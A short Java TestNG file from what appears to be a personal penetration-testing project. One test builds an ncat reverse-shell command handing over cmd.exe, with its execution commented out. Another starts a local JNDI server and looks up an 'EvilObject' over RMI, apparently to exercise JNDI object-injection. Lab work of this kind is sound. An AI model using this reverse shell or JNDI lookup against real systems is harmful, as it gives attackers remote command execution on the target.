package de.marko.pentest.reverseshell;

import de.marko.pentest.JNDIServer;
import java.io.IOException;
import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import org.testng.annotations.Test;

/**
 * @author marko
 * @version 1.0.0.
 * @date 22.08.2017
 */
public class ReverseShellTest {

	@Test
	public void T001_createReverseShell() throws IOException, InterruptedException {

		Runtime rt = Runtime.getRuntime();
		String[] commands = {"cmd.exe", "/c", "ncat -e cmd.exe 127.0.0.1 31338"};
		//Process pc = rt.exec(commands);
		//pc.destroy();

	}

	@Test
	public void T002_connectToJNDIInterface()
		throws RemoteException, NotBoundException, MalformedURLException, NamingException {

		String[] args = {};

		JNDIServer.main(args);

		// Create the initial context
		Hashtable env = new Hashtable();

		env.put(Context.PROVIDER_URL, "rmi://localhost:1099/EvilObject");

		Context ctx = new InitialContext(env);

		String uri = "rmi://localhost:1099/EvilObject";

		System.out.println("Using lookup() to fetch object with " + uri);

		Object o = ctx.lookup(uri);

		System.out.println(o.toString());

	}

}
